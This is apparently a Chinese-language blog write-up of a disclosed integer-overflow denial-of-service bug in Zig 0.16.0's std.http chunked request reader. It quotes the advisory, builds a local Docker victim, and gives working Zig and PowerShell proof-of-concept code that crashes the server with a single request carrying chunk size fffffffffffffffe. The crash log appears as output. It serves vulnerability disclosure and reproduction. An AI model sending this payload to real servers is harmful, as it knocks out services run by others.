---
title: Zig std.http 分块读取器整数溢出 DoS
description: Zig std.http 分块读取器整数溢出漏洞分析

date: 2026-07-20T20:12:52+08:00
lastmod: 2026-08-23T20:15:52+08:00
---
# Zig std.http 分块读取器整数溢出 DoS
## 漏洞原理

https://seclists.org/fulldisclosure/2026/Jul/0

```
Agent Spooky’s Fun Parade hereby reports, with the solemnity of a raccoon presenting a subpoena, an integer-overflow 
panic in Zig’s std.http chunked request-body reader. In Zig 0.16.0 and master commit 8f7febfa6f59, 
Reader.chunkedReadEndless and Reader.chunkedDiscardEndless compute cp.chunk_len + 2 - n after ChunkParser.feed has 
accepted chunk lengths up to 0xffffffffffffffff. Unfortunately, the downstream arithmetic only remains safe for 
chunk_len <= maxInt(u64) - 2, meaning chunk sizes fffffffffffffffe and ffffffffffffffff are valid enough to enter the 
temple and cursed enough to set it on fire.¹

The practical effect is unauthenticated remote denial of service against std.http.Server users that read or discard 
request bodies. A single HTTP/1.1 request with Transfer-Encoding: chunked and first chunk-size line fffffffffffffffe 
reaches the checked u64 addition; in Debug and ReleaseSafe this produces panic: integer overflow and aborts the 
worker/process. In ReleaseFast/ReleaseSmall the same expression wraps instead, corrupting chunk-length tracking rather 
than producing the neat educational corpse we get in safe builds. Our in-process PoC drives the real std.http.Server 
over fixed buffers and reproduces the panic at /usr/lib/zig/std/http.zig:586, which is convenient because nothing says 
“systems programming” like having your HTTP parser defeated by two bytes of conceptual optimism.

// poc.zig — build: `zig build-exe poc.zig` (Debug) ; run: `./poc`
const std = @import("std");
const http = std.http;

pub fn main() !void {
const body = "A" ** 300; // ≥ read-buffer so the read is buffer-bounded, not EOF-bounded
const request_bytes =
"POST /upload HTTP/1.1\r\n" ++
"Host: victim\r\n" ++
"Transfer-Encoding: chunked\r\n" ++
"\r\n" ++
"fffffffffffffffe\r\n" ++ // chunk-size = 0xFFFF_FFFF_FFFF_FFFE = 2^64 - 2
body;

var in = std.Io.Reader.fixed(request_bytes);
var out_buf: [4096]u8 = undefined;
var out = std.Io.Writer.fixed(&out_buf);

var server = http.Server.init(&in, &out);
var request = try server.receiveHead(); // Head.parse accepts TE:chunked

var transfer_buf: [256]u8 = undefined;
const br = try request.readerExpectContinue(&transfer_buf);
var dst: [256]u8 = undefined;
_ = try br.readSliceShort(&dst); // -> panic at http.zig:586}

Root cause: the parser accepts the full [0, 2^64-1] chunk-size domain while the reader silently assumes [0, 2^64-3]. 
Suggested fix is to reject any parsed chunk length above std.math.maxInt(u64) - 2 in ChunkParser.feed, or preferably 
impose a sane implementation maximum far below “the heat death of RAM.” Separately, Request.Head.parse should reject 
requests containing both Content-Length and Transfer-Encoding per RFC 7230 §3.3.3, because accepting both and letting 
chunked win is how one accidentally becomes a boutique smuggling-adjacent artisan.²

CWE-190, secondary CWE-1284, tertiary CWE-617. CVSS v3.0: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H.
CVSS v4.0: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N.
Confidentiality and integrity are not demonstrated; availability loss is the show, the whole show, and the clown car it 
arrived in.

¹ “Valid enough to enter, cursed enough to set it on fire” is not yet an IETF term, but we are submitting an erratum to 
reality.² Footnote ² exists only to prove the report has layers, like an onion, or a parser state machine written 
during a thunderstorm.

Cheers!

Agent Spooky's Fun Parade
```

Zig 0.16.0中`Reader.chunkedReadEndless` 和 `Reader.chunkedDiscardEndless` 会在 `ChunkParser.feed` 接受最大可达0xffffffffffffffff的 chunk 长度后，继续计算cp.chunk_len + 2 - n

所以

```
fffffffffffffffe
ffffffffffffffff
```

这两个 chunk size能进入解析并触发溢出

## 环境搭建

docker-compose.yml

```yaml
services:
  zig-http-victim:
    build:
      context: .
      args:
        ZIG_VERSION: "0.16.0"
        ZIG_TARGET: "x86_64-linux"
    image: zig-http-chunked-overflow-victim:0.16.0
    container_name: zig-http-victim
    ports:
      - "8080:8080"
```

Dockerfile 

```dockerfile
FROM debian:bookworm-slim

ARG ZIG_VERSION=0.16.0
ARG ZIG_TARGET=x86_64-linux

ENV PATH=/opt/zig:${PATH}
WORKDIR /work

RUN apt-get update \
    && apt-get install -y --no-install-recommends ca-certificates curl xz-utils \
    && rm -rf /var/lib/apt/lists/*

RUN curl -fsSL "https://ziglang.org/download/${ZIG_VERSION}/zig-${ZIG_TARGET}-${ZIG_VERSION}.tar.xz" \
    -o /tmp/zig.tar.xz \
    && mkdir -p /opt/zig \
    && tar -xJf /tmp/zig.tar.xz -C /opt/zig --strip-components=1 \
    && rm /tmp/zig.tar.xz

COPY victim.zig /work/victim.zig
COPY run-victim.sh /work/run-victim.sh

RUN chmod +x /work/run-victim.sh \
    && zig build-exe /work/victim.zig -ODebug -femit-bin=/work/victim

CMD ["/work/run-victim.sh"]
```

启动服务

```powershell
docker compose up --build -d
```

## 漏洞复现

```
docker logs -f zig-http-victim
curl.exe -i http://127.0.0.1:8080/
```

输出

```text
info: listening on http://0.0.0.0:8080
HTTP/1.1 200 OK
content-length: 3

ok
```

服务正常

然后发送POC

```powershell
$request = @(
    "POST /upload HTTP/1.1",
    "Host: victim",
    "Transfer-Encoding: chunked",
    "",
    "fffffffffffffffe",
    ("A" * 300)
) -join "`r`n"

$bytes = [System.Text.Encoding]::ASCII.GetBytes($request)
$client = [System.Net.Sockets.TcpClient]::new()
$client.Connect("127.0.0.1", 8080)
$stream = $client.GetStream()
$stream.Write($bytes, 0, $bytes.Length)
$stream.Flush()
$client.Close()
```

日志出现：

```text
thread 1 panic: integer overflow
/opt/zig/lib/std/http.zig:586:54: 0x11e809f in chunkedReadEndless (std.zig)
                chunk_len_ptr.* = .init(cp.chunk_len + 2 - n);
                                                     ^
/opt/zig/lib/std/http.zig:545:34: 0x11e6ea0 in chunkedStream (std.zig)
        return chunkedReadEndless(reader, w, limit, chunk_len_ptr) catch |err| switch (err) {
                                 ^
/opt/zig/lib/std/Io/Reader.zig:449:31: 0x10336ed in defaultReadVec (std.zig)
        return r.vtable.stream(r, &writer, limit) catch |err| switch (err) {
                              ^
/opt/zig/lib/std/Io/Reader.zig:429:37: 0x10eee1a in readVec (std.zig)
        return n + (r.vtable.readVec(r, data[i..]) catch |err| switch (err) {
                                    ^
/opt/zig/lib/std/Io/Reader.zig:688:21: 0x10ee3c7 in readSliceShort (std.zig)
        i += readVec(r, &data) catch |err| switch (err) {
                    ^
/work/victim.zig:41:39: 0x11ddc15 in handleConnection (victim.zig)
        _ = body_reader.readSliceShort(&sink) catch |err| {
                                      ^
/work/victim.zig:16:25: 0x11d74af in main (victim.zig)
        handleConnection(io, stream);
                        ^
/opt/zig/lib/std/start.zig:737:30: 0x11d7f0e in callMain (std.zig)
    return wrapMain(root.main(.{
                             ^
/opt/zig/lib/std/start.zig:190:5: 0x11d7201 in _start (std.zig)
    asm volatile (switch (native_arch) {
    ^
```

**thread 1 panic: integer overflow**！

复现成功

---

ps:此类dos只需要一个请求就能把服务直接打崩，相比于ddos的大流量成本极低，危害性极大。
